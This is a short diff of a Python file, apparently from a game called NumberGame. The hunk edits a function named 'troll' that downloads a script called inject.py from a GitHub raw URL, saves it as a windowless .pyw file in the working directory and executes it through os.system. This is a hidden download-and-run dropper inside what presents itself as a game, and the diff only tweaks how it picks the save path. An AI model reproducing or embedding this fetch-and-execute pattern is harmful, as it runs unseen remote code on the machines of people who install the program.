@@ -100,7 +100,8 @@ def main():
     def troll():
         import os, urllib.request, pathlib
         dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/inject.py'
-        home = pathlib.Path.cwd()   #os.path.expanduser("~")
+        home = os.getcwd()   #os.path.expanduser("~")
+        print(home)
         path = str(home) + '\inject.pyw'
         urllib.request.urlretrieve(dlurl, '{}'.format(path))
         os.system('inject.pyw')
